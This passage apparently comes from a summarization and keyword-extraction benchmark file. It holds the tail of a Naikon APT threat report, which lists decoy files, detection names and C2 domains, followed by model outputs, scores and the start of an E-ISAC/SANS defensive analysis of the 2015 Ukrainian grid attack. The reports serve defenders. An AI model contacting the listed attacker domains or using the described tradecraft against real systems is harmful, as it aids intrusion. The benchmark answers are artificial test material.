Content \u201cICJ\u2019s verdict owed respect 17 Apr 2013.doc\u201dImage 2. \u201cFDI Law Weeding Menu.doc\u201dImage 3. \u201cDanh sach dai bieu HNHTDMNC tai TPHCM.doc\u201dImage 4. \u201cThein Sein first European tour.doc\u201dImage 5. \u201cASEAN and Partners Firmly Committed To Narrowing Development Gap.doc\u201dImage 6. \u201cALP Statement on Present Illegal Bangali Problem inside Arakan.doc\u201dImage 7. \u201cISEAS Perspective 29nov12.doc\u201dImage 8. \u201cLearning Journal ASC 13-1_1.doc\u201d (related to url content/uploads/2013/01/finalfinalhandbookJan13.pdf, url 9. gia dinh.doc\u201d, delivered to VN targetswinMM-related Dropped Decoy Documents \u201cbook form for naning 30-8.doc\u201d Unknown. \u201cfact sheet asean-us ( president office format).doc\u201d Dropped by \u201cfact sheet asean-us ( president office format).doc .exe\u201d Trade and Investment (english).doc List of Attendance.doc Dropped by F14C42765F130EE6DEC3A87DC50A47E1Image 6. \u201ctalking point english(english).doc\u201d talking point myanmar (21-3-2013).docx Dropped by \u201ctalking point myanmar (21-3-2013).docx .exe\u201d tp for vp with swiss_myanmar[1].doc Dropped by \u201ctp for vp with swiss_myanmar[1].doc .exe\u201d Dropped by 7F422B43EEB93B230FF7553C841C4785Image 11. Unknown. \u201ctp for ec (myanmar).doc\u201d \u201ctrade and investment (english).doc\u201d \u201c11th bcim fapc memo.doc\u201d \u201c(r) final - h.e remarks.doc\u201d lo list(26-8-2013).docx \u201csightseeing tour in bagan.doc\u201d Ns admin.docx Components related to the Naikon APT are detected under a range of verdict names. Below is a listing of the most common: Backdoor.Win32.MsnMM.* Backdoor.Win32.MsnMM.a - .af Backdoor.Win32.Sakto.* Backdoor.Win32.Sakto.a - .ct Trojan-Downloader.Win32.Cordmix.* Trojan-Downloader.Win32.Cordmix.b Trojan-Downloader.Win32.Cordmix.ch Trojan-Downloader.Win32.Cordmix.cs Trojan-Downloader.Win32.Cordmix.ds HackTool.Win32.Agent.* HackTool.Win32.Agent.whjExploit.MSWord.CVE-2012-0158.* Exploit.MSWord.CVE-2012-0158.cb Exploit.MSWord.CVE-2012-0158.ci Exploit.MSWord.CVE-2012-0158.di Exploit.MSWord.CVE-2012-0158.dj Exploit.MSWord.CVE-2012-0158.du Exploit.MSWord.CVE-2012-0158.eb Exploit.Win32.CVE-2012-0158.* Exploit.Win32.CVE-2012-0158.a Exploit.Win32.CVE-2012-0158.aw Exploit.Win32.CVE-2012-0158.j Trojan-Dropper.MSWord.Agent.* Trojan-Dropper.MSWord.Agent.hc Exploit.OLE2.CVE-2012-1856.a HEUR:Exploit.MSWord.CVE-2012-0158.gen Exploit.OLE2.Toolbar.a Backdoor.Win32.Agent.* Backdoor.Win32.Agent.bjer Backdoor.Win32.Agent.dcyv Backdoor.Win32.Agent.dfbk Backdoor.Win32.Agent.dgpd Backdoor.Win32.Zegost.* Backdoor.Win32.Zegost.aekr Trojan.Win32.Agent.* Trojan.Win32.Agent.acflt Trojan.Win32.Agent.acfma Trojan.Win32.Agent.adddt Trojan.Win32.Agent.hofz Trojan.Win32.Agent.siai Trojan.Win32.Agent.spde Trojan.Win32.Agent.tlhi Trojan.Win32.Agent.tpbo Trojan.Win32.Agent.unhn Trojan.Win32.Agent.xikpTrojan.Win32.Agentb.* Trojan.Win32.Agentb.bbca Trojan.Win32.Agentb.bphx Trojan.Win32.Agentb.iqj Trojan.Win32.Agentb.jwp Trojan-Downloader.Win32.Agent.* Trojan-Downloader.Win32.Agent.gxqe Trojan-Downloader.Win32.Agent.zzrd Trojan-Spy.Win32.Agent.* Trojan-Spy.Win32.Agent.chrj Trojan-Spy.Win32.Agent.chuq Trojan-Spy.Win32.Agent.cibn Trojan-Spy.Win32.Agent.cicz Trojan-Spy.Win32.Agent.ciet Trojan-Spy.Win32.Agent.cifj Trojan-Spy.Win32.Agent.ciry Trojan-Spy.Win32.Agent.ciiu Trojan-Spy.Win32.Agent.cita Trojan-Spy.Win32.Agent.cjez Trojan-Spy.Win32.Agent.cjkg Trojan-Spy.Win32.Agent.cjmv Trojan.Win32.Pincav.* Trojan.Win32.Pincav.cngx Trojan.Win32.Sasfis.* Trojan.Win32.Sasfis.dmmt Trojan-Dropper.MSIL.Agent.* Trojan-Dropper.MSIL.Agent.aidh Trojan-Dropper.Win32.Dycler.* Trojan-Dropper.Win32.Dycler.ssr Trojan-Dropper.Win32.Dycler.sss Trojan-Dropper.Win32.Injector.* Trojan-Dropper.Win32.Injector.jujl Trojan-Dropper.Win32.Injector.kblf Trojan-Dropper.Win32.Injector.kbre Trojan.Win32.Zapchast.* Trojan.Win32.Zapchast.aerrTrojan.Win32.Zapchast.aest Trojan.Win32.Zapchast.aetr Trojan.Win32.Zapchast.aety Trojan.Win32.Zapchast.aevb Trojan.Win32.Zapchast.aevg Trojan.Win32.Zapchast.afma Trojan.Win32.Zapchast.afcz HEUR:Trojan.Win32.Generic HEUR:Trojan.Win32.Invader Appendix C: Md5 Reference Set Appendix D: C2 (Domain) Reference Set ahzx.eicp.net bkav.imshop.in googlemm.vicp.net mncgn.51vip.biz myanmartech.vicp.net thailand.vicp.net ubaoyouxiang.gicp.net vietnam.gnway.net For full indicator and other details, please contact intelreports@kaspersky.com ", "generated_text": "the document; the first stage; tools; targeted organizations; countries; email; spear; malware; CVE-2012-0158; CVE-2012-0158 exploits; system administration; a custom network; service scanner; a custom network service scanner; an attack codeset; Honker Union; Chinese-speaking forums; a custom pdf binding tool; the Naikon APT; use; some targets; 2014; a custom PDF binding tool; the group; Backdoor functionality; indicators; 2015; APTs; tactics; network traffic; the Naikon APT group; social engineering; high-tech toolsets.", "ref_text": "<START-1>The document discusses the campaigns and tools used by a threat actor group referred to as the Naikon APT. This group has conducted cyber espionage campaigns targeting organizations in Southeast Asia, particularly ASEAN nations, since around 2009. The group has used various backdoors and malware tools over the years, many with \"MM\" in their names, such as MsnMM, WinMM, WininetMM. These tools have shared code, functionality, infrastructure, and targeting focuses. The group has relied heavily on spear-phishing to deliver its malware, using exploits for Microsoft Office and decoy documents relevant to its targets. The PDF examines the group's earliest campaigns, under the codename MsnMM, and traces the evolution of its tools over time. It provides technical analysis of malware samples like SslMM, WinMM, Inject, and Sakto/WininetMM. The group's later campaigns employed more sophisticated backdoors like Naikon/xsPlus and Rarstone. The report highlights the shared code, infrastructure, and targeting between the MsnMM and later Naikon campaigns. Both used the same exploit kit to generate malware. They shared domains and IP addresses for command and control. The spear-phishing content and decoys align with an ASEAN focus. Victim organizations have included government, military, law enforcement, media, and energy sector entities in Vietnam, Myanmar, Singapore, Malaysia, Philippines, and elsewhere. The report concludes the Naikon APT is a persistent, prolific cyber espionage actor focused on the South China Sea region. <END-1>", "t5/keyword/hint_hit_precision": 0.21212121212121213, "t5/word/hint_hit_recall": 0.049107142857142856, "gpt3/lexical/rouge_rouge1": 0.3767313019390582, "gpt3/lexical/rouge_rouge2": 0.07242339832869081, "gpt3/lexical/rouge_rougeL": 0.21052631578947367, "gpt3/lexical/rouge_rougeLsum": 0.21052631578947367, "gpt3_generated_text": ["The article discusses the Naikon APT campaigns, which target organizations in specific countries using a variety of tools and techniques. These campaigns involve the deployment of backdoors such as sslMM, xsControl/naikon, rarstone, and second stage tools. The group also utilizes spear-phishing emails with CVE-2012-0158 exploits to deliver malware to victim systems. Additionally, the Naikon attackers gather detailed information about their targets through social engineering tactics. The group has been active in countries like Myanmar, Vietnam, Singapore, Laos, Malaysia, and the Philippines. The Naikon APT's use of a custom network service scanner, attack codeset, and a custom PDF binding tool sets them apart from other APT groups. Despite facing challenges from anti-malware products, the Naikon APT continues to evolve their tactics and toolsets to evade detection."]}, {"split_name": "val", "sample_id": "val_41", "prompt_text": "Extract the keywords: TLP: White Analysis of the Cyber Attack on the Ukrainian Power Grid Defense Use CaseMarch 18, 2016Table of ContentsPreface iiiSummary of Incidents ivAttacker Tactics Techniques and Procedures Description 1ICS Cyber Kill Chain Mapping 4Defense Lessons Learned \u2013 Passive and Active Defenses 11Recommendations 18Implications and Conclusion 20Appendix Information Evaluation 22E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 2016iiPrefaceAnalysis of the Cyber Attack on the Ukrainian Power Grid This is an analysis by a joint team to provide a lessons learned community resource from the cyber attack on the Ukrainian power grid. The document is being released as Traffic Light Protocol: White (TLP: White) and may be distributed without restriction, subject to copyright controls. This document, the Defense Use Case (DUC), summarizes important learning points and presents several mitigation ideas based on publicly available information on ICS incidents in Ukraine. The E-ISAC and SANS are providing a summary of the available information compiled from multiple publicly available sources as well as analysis performed by the SANS team in relation to this event.1 This document provides specific mitigation concepts for power system Supervisory Control and Data Acquisition (SCADA) defense, as well as a general learning opportunity for ICS defenders. Authors, working with the E-ISAC: Robert M. Lee, SANS Michael J. Assante, SANS Tim Conway, SANS1 The SANS investigation into this incident should not be confused with the U.S. interagency team investigation or any other organization or company\u2019s efforts to include the E-ISAC\u2019s past reporting. SANS ICS team has been analyzing the data on their own since December 25, 2015, and has provided its analysis to the wider community. This document is provided to E-ISAC and the North American electricity sector to benefit its members and the larger critical infrastructure community.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 2016iiiSummary of IncidentsOn December 23, 2015, the Ukrainian Kyivoblenergo, a regional electricity distribution company, reported service outages to customers. The outages were due to a third party\u2019s illegal entry into the company\u2019s computer and SCADA systems: Starting at approximately 3:35 p.m. local time, seven 110 kV and 23 35 kV substations were disconnected for three hours. Later statements indicated that the cyber attack impacted additional portions of the distribution grid and forced operators to switch to manual mode.2, 3 The event was elaborated on by the Ukrainian news media, who conducted interviews and determined that a foreign attacker remotely controlled the SCADA distribution management system.4 The outages were originally thought to have affected approximately 80,000 customers, based on the Kyivoblenergo\u2019s update to customers. However, later it was revealed that three different distribution oblenergos (a term used to describe an energy company) were attacked, resulting in several outages that caused approximately 225,000 customers to lose power across various areas.5, 6Shortly after the attack, Ukrainian government officials claimed the outages were caused by a cyber attack, and that Russian security services were responsible for the incidents.7 Following these claims, investigators in Ukraine, as well as private companies and the U.S. government, performed analysis and offered assistance to determine the root cause of the outage.8 Both the E-ISAC and SANS ICS team was involved in various efforts and analyses in relation to this case since December 25, 2015, working with trusted members and organizations in This joint report consolidates the open source information, clarifying important details surrounding the attack, offering lessons learned, and recommending approaches to help the ICS community repel similar attacks. This report does not focus on attribution of the attack.2 url 3 url 4 url 5 url 6 url 7 url 8 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 2016ivSummary of Information and Reporting On December 24, 2015, TSN (a Ukrainian news outlet) released the report \u201cDue to a Hacker Attack Half of the Ivano-Frankivsk Region is De-Energized.\u201d9 Numerous reporting agencies and independent bloggers from the Washington Post, SANS Institute, New York Times, ARS Technica, BBC, Wired, CNN, Fox News, and the E-ISAC Report have followed up on the initial TSN report.10 These subsequent reports have collectively provided details of a cyber attack that targeted the Ukrainian electric system. The U.S. Department of Homeland Security (DHS) issued a formal report on February 25, 2016, titled IR-ALERT-H-16-056-01.11 Based on the DHS report, three Ukrainian oblenergos experienced coordinated cyber attacks that were executed within 30 minutes of each other. The attack impacted 225,000 customers and required the oblenergos to move to manual operations in response to the attack. The oblenergos were reportedly able to restore service quickly after an outage window lasting several hours.12 The DHS report states that, while electrical service was restored, the impacted oblenergos continue to operate their distribution systems in an operationally constrained mode. Within the Ukrainian electrical system, these attacks were directed at the regional distribution level, as shown in Figure 1.Figure 1: Electric System Overview9 url 10 E-ISAC: Mitigating Adversarial Manipulation of Industrial Control Systems as Evidenced by Recent International Events, February 9, 2016 (TLP=RED) 11 url 12 url ukraine/2016/01/05/4056a4dc-b3de-11e5-a842-0feb51d1d124 story.htmlE-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 2016vSummary of IncidentsSee the Appendix for an evaluation of the credibility and amount of technical information that is publicly The cyber attacks in Ukraine are the first publicly acknowledged incidents to result in power outages. As future attacks may occur, it is important to scope the impacts of the incident. Power outages should be measured in scale (number of customers and amount of electricity infrastructure involved) and in duration to full restoration. The Ukrainian incidents affected up to 225,000 customers in three different distribution-level service territories and lasted for several hours. These incidents should be rated on a macro scale as low in terms of power system impacts as the outage affected a very small number of overall power consumers in Ukraine and the duration was limited. In contrast, it is likely that the impacted companies rate these incidents as high or critical to the reliability of their systems and business operations.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 2016viAttacker Tactics Techniques and Procedures DescriptionDirect attribution is unnecessary to learn from this attack and to consider mitigation strategies; it is only necessary to use the mental model of how the cyber actor works to understand the capabilities and general profile against which one is defending. The motive and sophistication of this power grid attack is consistent with a highly structured and resourced actor. This actor was co-adaptive and demonstrated varying tactics and techniques to match the defenses and environment of the three impacted targets. The mitigation section of this document provides mitigation concepts related to the attack and how to develop a more lasting mitigation strategy by anticipating future attacks. The attackers demonstrated a variety of capabilities, including spear phishing emails, variants of the BlackEnergy 3 malware, and the manipulation of Microsoft Office documents that contained the malware to gain a foothold into the Information Technology (IT) networks of the electricity companies.13 They demonstrated the capability to gain a foothold and harvest credentials and information to gain access to the ICS network. Additionally, the attackers showed expertise, not only in network connected infrastructure; such as Uninterruptable Power Supplies (UPSs), but also in operating the ICSs through supervisory control system; such as the Human Machine Interface (HMI), as shown in Figure 2.Figure 2: Control & Operate: SCADA Hijacking TechniquesFinally, the adversaries demonstrated the capability and willingness to target field devices at substations, write custom malicious firmware, and render the devices, such as serial-to-ethernet convertors, inoperable and13 For a discussion around the history of the BlackEnergy 3 malware and Sandworm team see the SANS ICS webcast with iSight here: url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20161Attacker Tactics Techniques and Procedures Descriptionunrecoverable.14 In one case, the attackers also used telephone systems to generate thousands of calls to the energy company\u2019s call center to deny access to customers reporting outages. However, the strongest capability of the attackers was not in their choice of tools or in their expertise, but in their capability to perform long-term reconnaissance operations required to learn the environment and execute a highly synchronized, multistage, The following is a consolidated list of the technical components used by the attackers, graphically depicted in Figure 3:Identification of BlackEnergy 3 at each of the impacted oblenergos\uf0b7 Spear phishing to gain access to the business networks of the oblenergos \uf0b7 \uf0b7 Theft of credentials from the business networks \uf0b7 The use of virtual private networks (VPNs) to enter the ICS network \uf0b7 The use of existing remote access tools within the environment or issuing commands directly from aremote station similar to an operator HMI\uf0b7 Serial-to-ethernet communications devices impacted at a firmware level15 \uf0b7 The use of a modified KillDisk to erase the master boot record of impacted organization systems as wellas the targeted deletion of some logs16\uf0b7 Utilizing UPS systems to impact connected load with a scheduled service outage \uf0b7 Telephone denial-of-service attack on the call centerFigure 3: Ukraine Attack Consolidated Technical ComponentsAt various points in the public reporting on the attack, organizations have indicated that BlackEnergy 3 and KillDisk itself could be directly responsible for the outage. One of the items specifically highlighted to support14url id=24508688 6&cat id=35109 15 To learn about serial to ethernet converters and the types of vulnerabilities that exist to them see DigitalBond\u2019s Basecamp report here: url 16 url organizationsE-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20162Attacker Tactics Techniques and Procedures Descriptionlinked to serial-to-ethernet this theory was that KillDisk deleted a process on Windows systems communications.17 Regardless of the impact of the SCADA network environment, neither BlackEnergy 3 nor KillDisk contained the required components to cause the outage. The outages were caused by the use of the control systems and their software through direct interaction by the adversary. All other tools and technology, such as BlackEnergy 3 and KillDisk, were used to enable the attack or delay restoration efforts. Multiple opportunities existed for the adversary to execute its attack. External to the oblenergos and prior to the attack, there was a variety of open-source information available; including a detailed list of types of infrastructure such as Remote Terminal Unit (RTU) vendors and versions posted online by ICS vendors.18 The VPNs into the ICS from the business network appear to lack two-factor authentication. Additionally, the firewall allowed the adversary to remote admin out of the environment by utilizing a remote access capability native to the systems. In addition, based on media reporting, there did not appear to be any resident capability to continually monitor the ICS network and search for abnormalities and threats through active defense measures; like network security monitoring. These vulnerabilities would have provided the adversary the opportunity to persist within the environment for six months or more to conduct reconnaissance on the environment and subsequently execute the attack.19 Based on the details provided in the DHS report, the adversary used a consistent attack approach on all three impacted targets. The adversary also used consistent tactics to impact field controllable elements and irreparably damage field devices. Why these oblenergos were targeted remains an open debate. Based on the public reporting, it is unknown if the targets were selected based on common technologies in use, system architectures, reconnaissance operations, or service territories. Opportunity-based considerations for selecting a specific target may focus on an attacker\u2019s confidence and ability to cause an ICS effect. Some example decision factors could include:\uf0b7 Targets with common systems and configurations\uf0b7 Multiple systems with common centralized control points\uf0b7ICS impact duration estimates (e.g., long term or short term)\uf0b7 Existing capabilities required to achieve desired results\uf0b7 Risk level of performing the operation and being discovered\uf0b7 Achieved access and ability to move and act within the environment17 url outage-in-ukraine/ 18 url 19 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20163ICS Cyber Kill Chain MappingThe ICS Cyber Kill Chain was published by SANS in 2015 by Michael Assante and Robert M. Lee as an adaptation of the traditional cyber kill chain developed by Lockheed Martin analysts as it applied to ICSs.20 The ICS Cyber Kill Chain details the steps an adversary must follow to perform a high-confidence attack on the ICS process and/or cause physical damage to equipment in a predictable and controllable way, as displayed in Figure 4.Figure 4: The ICS Cyber Kill Chain with Stage 1 HighlightedThe attack on the Ukrainian power grid followed the ICS Cyber Kill Chain completely throughout Stage 1 and Stage 2. The attack gained access to each level of the ICS, as shown in Figure 5, with the ICS Cyber Kill Chain plotted alongside a segmentation/hierarchy model (e.g., modified Purdue Model). Completing Stage 1 entails a successful cyber intrusion or breach into an ICS system, but is not characterized as an ICS attack. Completion of Stage 2 completed the ICS Kill Chain, resulting in a successful cyber attack that led to an impact on the operations of the ICS. The next section includes a discussion of the two stages using currently available information from the attack.20 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20164ICS Cyber Kill Chain MappingFigure 5: Ukraine Cyber Attack ICS Cyber Kill Chain and Purdue Model Mapping21ICS Cyber Kill Chain Mapping \u2013 Stage 1 The first step in Stage 1 is Reconnaissance. There were no reports of observed reconnaissance having taken place prior to targeting the energy companies. However, an analysis of the three impacted organizations shows they were particularly interesting targets due to the levels of automation in their distribution system; enabling the remote opening of breakers in a number of substations. Additionally, the targeting and final attack plan for the electricity companies in general were highly coordinated, which indicates that reconnaissance took place at some point. This was very unlikely to have been an opportunistic attack. The second step is Weaponization and/or Targeting. Targeting would normally take place when no weaponization is needed; such as directly accessing internet connected devices. In this attack, it does not appear that targeting of specific infrastructure was necessary to gain access. Instead, the adversaries weaponized Microsoft Office documents (Excel and Word) by embedding BlackEnergy 3 within the documents.22 Samples of Excel and other office documents have been recovered from the broader access campaign that targeted a multitude of organizations in Ukraine; including Office documents used in the specific attack against the three electricity companies.23, 24 During the cyber intrusion stage of Delivery, Exploit, and Install, the malicious Office documents were delivered21 Note, the exact architectures of the impacted utilities are not represented in the figure. The Purdue Model is a standard way of viewing different zones of a well-constructed ICS. 22 url 23 url 24 Those looking for Indicators of Compromise for the word document, command and control servers, and the malware should look to E- ISAC, ICS-CERT, and iSight private reporting as well as public reporting from Kaspersky Labs, ESET, and CYS Centrum reference: url energy 2 3 url ukraine-employ-spearphishing-with-word-documents/andE-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20165ICS Cyber Kill Chain Mappingvia email to individuals in the administrative or IT network of the electricity companies. When these documents were opened, a popup was displayed to users to encourage them to enable the macros in the document as shown in Figure 6.25 Enabling the macros allowed the malware to Exploit Office macro functionality to install BlackEnergy 3 on the victim system and was not an exploit of a vulnerability through exploit code. There was no observed exploit code in this incident. The theme of using available functionality in the system was present throughout the adversary\u2019s kill chain.Figure 6: A Sample of a BlackEnergy 3 Infected Microsoft Office Document26Upon the Install step, the BlackEnergy 3 malware connected to command and control (C2) IP addresses to enable communication by the adversary with the malware and the infected systems. These pathways allowed the adversary to gather information from the environment and enable access. The attackers appear to have gained access more than six months prior to December 23, 2015, when the power outage occurred.27 One of their first actions happened when the network was to harvest credentials, escalate privileges, and move laterally throughout the environment (e.g., target directory service infrastructure to directly manipulate and control the authentication and authorization system). At this point, the adversary completed all actions to establish persistent access to the targets. While the initial footholds were used to harvest legitimate credentials for pivoting and systematic takeover of IT systems and remote connections, it is likely that the attackers moved quickly away from their initial footholds and vulnerable C2s in an effort to blend into the target\u2019s systems as authorized users. With this information, the attackers would be able to identify VPN connections and avenues from the business network into the ICS network. Using native connections and commands allows the attackers to discover the remainder of the systems and extract data necessary to formulate a plan for Stage 2.25 For a detailed understanding of the infected Microsoft Office documents and the malicious payload see Kaspersky Lab\u2019s write-up here: url 26 url 27url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20166ICS Cyber Kill Chain Mappingthe networkinSpeculation There was not enough publicly available information to determine how diversified the adversary\u2019s attack was to include how many different types of devices were impacted at the firmware level. However, through publicly available information about the Ukrainian networks, as well as knowledge of similar electric distribution systems, it is likely that there was a diverse hardware and software environment. It is suspected that the administrative and ICS networks contained multiple OS versions such as Windows XP and Windows 7, multiple types of RTUs and gateways, and various industrial switches.Using the stolen credentials, the adversary was able to pivot segments where SCADA dispatch into workstations and servers existed. Upon entry into the network, the actions of the adversaries were consistent in theme but different in technical minutia between the three impacted oblenergoss. In at least one of the oblenergos, the attackers discovered a network connected to a UPS and reconfigured it so that when the attacker caused a power outage, it was followed by an event that would also impact the power the energy company\u2019s buildings or data There is not sufficient information available to identify if any information was exfiltrated from the environment, but the adversary demonstrated a capability in Stage 2 that indicates internal discovery was performed. This reconnaissance would have needed to include discovering field devices such as the serial-to-ethernet devices used to interpret commands from the SCADA network to the substation control systems. Additionally, the three oblenergos used different distribution management systems (DMSs), and the attackers would have needed to perform some network reconnaissance against these systems and find specific targets to execute their highly coordinated attack.28 ICS Cyber Kill Chain Mapping \u2013 Stage 2 In most cases, the Develop stage occurs in the adversary\u2019s networks, thereby limiting any available forensic information, but the attack that follows this stage can reveal a lot about the adversarial process. In the Attack Development and Tuning Stage of Stage 2, the attackers executed the Develop step in at least two ways. First, they learned how to interact with the three distinct DMS environments using the native control present in the system and operator screens. Second, and more importantly, they developed malicious firmware for the serial- to-ethernet devices.29 Currently available information indicates that the malicious firmware was consistent amongst devices and uploaded within short periods of each other to multiple sites. Therefore, the malicious uploads of firmware was likely developed prior to the attack for quick and predictable execution. E-ISAC and the SANS ICS team assess with high confidence that, during the Validation Stage of Stage 2, the adversary did Test their capabilities prior to their deployment. It is possible that the adversaries were able to execute this with pure luck, but it is highly unlikely and inconsistent with the professionalism observed throughout the rest of the attack. The adversaries likely had systems in their organization that they were able to evaluate and test their firmware against prior to executing on December 23rd.28 The three different DMS vendors were discoverable via open-source searching. The names of the vendors are being withheld as it is not important to the discussion of the attack. There were no exploits leveraged against these vendors but they were simply abused with direct access. 29url id=24508688 6&cat id=35109E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20167ICS Cyber Kill Chain MappingDuring the ICS Attack Stage, the adversaries used native software to Deliver themselves into the environment for direct interaction with the ICS components. They achieved this using existing remote administration tools on the operator workstations. The threat actors also continued to use the VPN access into the IT environment.30 In final preparation for the attack, the adversaries completed the Install/Modify stage by installing malicious software identified as a modified or customized KillDisk across the environment. While it is likely the attackers then ensured their modifications to the UPS were ready for the attack, there was not sufficient forensic evidence available to prove this. The last act of modification was for the adversaries to take control of the operator workstations and thereby lock the operators out of their systems. Figure 7 shows the static analysis of the KillDisk API imports following the event.Figure 7: Static Analysis of KillDisk Identifying API Imports31Finally, to complete the ICS Cyber Kill Chain and to Execute the ICS Attack, the adversaries used the HMIs in the SCADA environment to open the breakers. At least 27 substations (the total number is probably higher) were taken offline across the three energy companies, impacting roughly 225,000 customers.32, 33 Simultaneously, the attackers uploaded the malicious firmware to the serial-to-ethernet gateway devices. This ensured that even if30url id=24508688 6&cat id=35109 31 This image was provided by Jake Williams of Rendition InfoSec. It is included here to note that KillDisk would not run properly in a malware sandbox for analysis. Static analysis was required to fully investigate the malware sample. 32 url 33 In analysis of the impact observed and on the available information on the Ukrainian distribution grid it is assessed with medium confidence that the public number of disconnected substations, 27, is a low number.E-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20168ICS Cyber Kill Chain Mapping(We have characterizedthefirmware attacks againstthe operator workstations were recovered, remote commands could not be issued to bring the substations back online field communication devices as \u201cblowing the bridges\u201d). During this same period, the attackers also leveraged a remote telephonic denial of service on the energy company\u2019s call center with thousands of calls to ensure that impacted customers could not report outages. Initially, it seemed that this attack was to keep customers from informing the operators of how extensive the outages were; however, in review of the entirety of the evidence, it is more likely that the denial of service was executed to frustrate the customers since they could not contact customer support or gain clarity regarding the outage. The entire attack from March 2015 \u2013 December 23, 2015 is graphically depicted below in Figure 8.Figure 8: ICS Kill Chain Mapping ChartE-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 20169ICS Cyber Kill Chain MappingIt is extremely important to note that neither BlackEnergy 3, unreported backdoors, KillDisk, nor the malicious firmware uploads alone were responsible for the outage. Each was simply a component of the cyber attack for the purposes of access and delay of restoration. For example, on some systems, KillDisk made the Windows systems inoperable by manipulating or deleting the master boot record, but on other systems it just deleted logs and system events.34, 35 The actual cause of the outage was the manipulation of the ICS itself and the loss of control due to direct interactive operations by the adversary. The loss of view into the system through the wiping of the SCADA network systems simply delayed restoration efforts. In summary, Stage 2 consisted of the following attack elements:\uf0b7 Supporting attacks:o Schedule disconnects for UPS systems o Telephonic floods against at least one oblenergos\u2019 customer support line\uf0b7 Primary attack: SCADA hijack with malicious operation to open breakers \uf0b7 Amplifying attacks:o KillDisk wiping of workstations, servers, and an HMI card inside of an RTU o Firmware attacks against Serial-to-Ethernet devices at substations34 url 35 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201610Defense Lessons Learned \u2013 Passive and Active DefensesWe reviewed the mitigation strategies provided through the DHS ICS-CERT Alert and considered how an adversary may alter the next attack based on the mitigation taken by a target. We support many of the mitigation recommendations provided to date. However, it is likely that the adversary will modify attack approaches in follow-on campaigns and these mitigation strategies may not be sufficient. In the following section, we discuss mitigations for the attack that took place to extract defense lessons learned. In addition, we discuss future potential attacker methodologies and provide recommendations that could disrupt similar adversary\u2019s operations. The mitigations will focus on recommendations for Architecture, Passive Defense, and Active Defense methodologies along the Sliding Scale of Cyber Security, shown in Figure 9.36Figure 9: The Sliding Scale of Cyber SecuritySpear Phishing In the attack, the adversary delivered a targeted email with a malicious attachment that appeared to come from a trusted source to specific individuals within the organizations. Initial mitigation recommendations would point to end-user awareness training and ongoing phishing testing. Efforts to prevent malware have often recommended application whitelisting, which can be effective in ICS environments if the ICS vendor approves of the use. However, based on the details of this attack, application whitelisting would have had a limited role contained to the execution of initial dropper infections in network segments with infected workstations (e.g., users that received and activated infected spear phish emails) where application whitelisting may be more challenging to implement. It is important to note that application whitelisting would not have deterred or prevented the second stage ICS attacks that impacted the Ukrainian oblenergos. In at least one instance, the attacker used a remote rogue client and approved OS-level remote admin features for other components of the The Next Attack The adversary may conduct follow-on attacks that pursue alternative forms of social engineering campaigns, like targeting the organization through large-scale phishing campaigns, using water-holing attacks, or conducting direct-call campaigns to users or the help desk. They could also leverage technical exploits not requiring social engineering of personnel.36 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201611Defense Lessons Learned \u2013 Passive and Active DefensesOpportunities to Disrupt The adversary will likely modify attacks to respond to increases or changes in the target\u2019s defenses. Defenders need to develop anticipatory responses to attack effects. Since the social engineering components of attacks targeted email and internet accessible cyber assets, these assets and the networks they reside on are untrusted contested territory. Communication with these untrusted areas should be segmented, monitored, and controlled. Operate under the assumption that the environment is accessible by the adversary and ensure appropriate defenses are in place to protect the operations and control environment from the adversary- controlled business cyber assets (while some organizations inherently trust their business systems and networks, additional enforcement and scrutiny of these systems is necessary). Consider using sandboxing technology to evaluate documents and emails coming into the network, using proxy systems to control outbound and inbound communication paths, and limiting workstations to communicate only through the proxy devices by implementing perimeter egress access controls. In the attack, the adversary appears to have used BlackEnergy 3 to establish a foothold and utilize keystroke loggers to perform credential theft. As an initial mitigation approach, we recommend that organizations obtain the YARA rules for the latest IOCs. By using the YARA forensic tool, organizations can search for BlackEnergy 3 infections and then utilize antimalware removal tools to eliminate the malware from the infected assets. Defenders should be mindful of the time it takes to detect an infected host as the intruder may have already moved inside the network and secured additional methods to interact and communicate with the infected network. Organizations should change user and shared user passwords (ensure that these steps are approved by operations and the vendor, and tested for impacts to operations and existing security controls). The Next Attack Adversaries with persistent access will simply use a different remote access Trojan, an updated version of BlackEnergy 3, or an alternate mode of credential attacks. To detect and mitigate adversary movement throughout an environment and account manipulation, mitigation efforts should be focused on directory (e.g., Active Directory, Domain, eDirectory, and LDAP) segmentation with organizational unit trust models. This approach would allow early detection and prevent some basic attacker approaches. Opportunities to Disrupt Monitor user account behavior, network and system communication, and directory-level activity with a focus on identifying abnormalities. Implement alarm capabilities with different priority-level alarms based on the risk of the systems associated with the alarms. It is important to note that YARA is a forensics tool and is not a continuous monitoring solution. After the attackers achieved the necessary freedom of movement and action in the IT infrastructure, they began exfiltrating the necessary information and discovering the hosts and devices to devise an attack concept to hijack the SCADA DMS to open breakers and cause a power outage. They followed this with destructive attacks against workstations, servers, and embedded devices that provide industrial communications in their distribution substations. The mitigation recommendation here is to understand where this type of information exists inside your business network and ICSs. Minimizing where the information resides and controlling access isE-ISAC | Analysis of the Cyber Attack on the Ukrainian Power Grid | March 18, 201612Defense Lessons Learned \u2013 Passive and Active Defensesa priority for an ICS dependent organization. The Next Attack Attackers may look deeper into the ICS configuration and settings or controller and protection/safety logic. Ensure to maintain a vaulted copy of known good project files, control and safety logic, and firmware. Also using file integrity checkers to monitor access or sample loaded files for changes. Opportunities to Disrupt Realize that attackers may be able to develop additional attack approaches as they have learned a system and may have stolen information that allows for the development of more powerful future attacks. Defenders should examine their detection and response capabilities. Decision makers should review their 